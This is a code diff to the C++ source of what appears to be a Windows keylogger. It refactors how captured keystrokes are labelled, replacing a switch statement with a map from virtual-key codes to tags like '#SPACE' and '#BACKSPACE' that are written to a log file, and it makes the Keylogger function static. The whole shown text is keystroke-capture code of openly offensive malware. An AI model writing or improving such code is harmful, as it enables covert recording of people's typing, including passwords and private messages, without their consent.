@@ -1,6 +1,56 @@
 #include "syscalls.h"
 
 std::atomic<bool> keyloggerRunning = false;
+const std::map<int, std::string> specialKeys = {
+	{VK_SPACE, "#SPACE"},
+	{VK_RETURN, "#RETURN"},
+	{VK_BACK, "#BACKSPACE"},
+	{VK_LBUTTON, "#L_CLICK"},
+	{VK_RBUTTON, "#R_CLICK"},
+	{VK_CAPITAL, "#CAPS_LOCK"},
+	{VK_TAB, "#TAB"},
+	{VK_UP, "#UP_ARROW_KEY"},
+	{VK_DOWN, "#DOWN_ARROW_KEY"},
+	{VK_LEFT, "#LEFT_ARROW_KEY"},
+	{VK_RIGHT, "#RIGHT_ARROW_KEY"},
+	{VK_CONTROL, "#CONTROL"},
+	{VK_MENU, "#ALT"},
+	{VK_ESCAPE, "#ESCAPE"},
+	{VK_END, "#END"},
+	{VK_HOME, "#HOME"},
+	{VK_INSERT, "#INSERT"},
+	{VK_DELETE, "#DELETE"},
+	{VK_SHIFT, "#SHIFT"},
+	{VK_LSHIFT, "#LEFT_SHIFT"},
+	{VK_RSHIFT, "#RIGHT_SHIFT"},
+	{VK_LCONTROL, "#LEFT_CONTROL"},
+	{VK_RCONTROL, "#RIGHT_CONTROL"},
+	{VK_LMENU, "#LEFT_ALT"},
+	{VK_RMENU, "#RIGHT_ALT"},
+	{VK_LWIN, "#LEFT_WINDOWS"},
+	{VK_RWIN, "#RIGHT_WINDOWS"},
+	{VK_SNAPSHOT, "#PRINT_SCREEN"},
+	{VK_SCROLL, "#SCROLL_LOCK"},
+	{VK_PAUSE, "#PAUSE"},
+	{VK_F1, "#F1"},
+	{VK_F2, "#F2"},
+	{VK_F3, "#F3"},
+	{VK_F4, "#F4"},
+	{VK_F5, "#F5"},
+	{VK_F6, "#F6"},
+	{VK_F7, "#F7"},
+	{VK_F8, "#F8"},
+	{VK_F9, "#F9"},
+	{VK_F10, "#F10"},
+	{VK_F11, "#F11"},
+	{VK_F12, "#F12"},
+	{VK_NUMLOCK, "#NUM_LOCK"},
+	{VK_MULTIPLY, "#NUMPAD_MULTIPLY"},
+	{VK_ADD, "#NUMPAD_ADD"},
+	{VK_SUBTRACT, "#NUMPAD_SUBTRACT"},
+	{VK_DECIMAL, "#NUMPAD_DECIMAL"},
+	{VK_DIVIDE, "#NUMPAD_DIVIDE"}
+};
 
 void LOG(std::string input) {
 	std::fstream LogFile;
@@ -11,66 +61,16 @@ void LOG(std::string input) {
 	}
 }
 
-
 bool SpecialKeys(int S_Key) {
-	switch (S_Key) {
-	case VK_SPACE:
-		LOG("#SPACE");
+	int entry = specialKeys.find(S_Key) != specialKeys.end() ? S_Key : -1;
+	if (entry != -1) {
+		LOG(specialKeys.at(entry));
 		return true;
-	case VK_RETURN:
-		LOG("#RETURN");
-		return true;
-	case '¾':
-		LOG(".");
-		return true;
-	case VK_SHIFT:
-		LOG("#SHIFT");
-		return true;
-	case VK_BACK:
-		LOG("#BACKSPACE");
-		return true;
-	case VK_LBUTTON:
-		LOG("#L_CLICK");
-		return true;
-	case VK_RBUTTON:
-		LOG("#R_CLICK");
-		return true;
-	case VK_CAPITAL:
-		LOG("#CAPS_LOCK");
-		return true;
-	case VK_TAB:
-		LOG("#TAB");
-		return true;
-	case VK_UP:
-		LOG("#UP_ARROW_KEY");
-		return true;
-	case VK_DOWN:
-		LOG("#DOWN_ARROW_KEY");
-		return true;
-	case VK_LEFT:
-		LOG("#LEFT_ARROW_KEY");
-		return true;
-	case VK_RIGHT:
-		LOG("#RIGHT_ARROW_KEY");
-		return true;
-	case VK_CONTROL:
-		LOG("#CONTROL");
-		return true;
-	case VK_MENU:
-		LOG("#ALT");
-		return true;
-	case VK_ESCAPE:
-		LOG("#ESCAPE");
-		return true;
-	case VK_END:
-		LOG("#END");
-		return true;
-	default:
-		return false;
 	}
+	return false;
 }
 
-void Keylogger()
+static void Keylogger()
 {
 	unsigned char KEY;
 
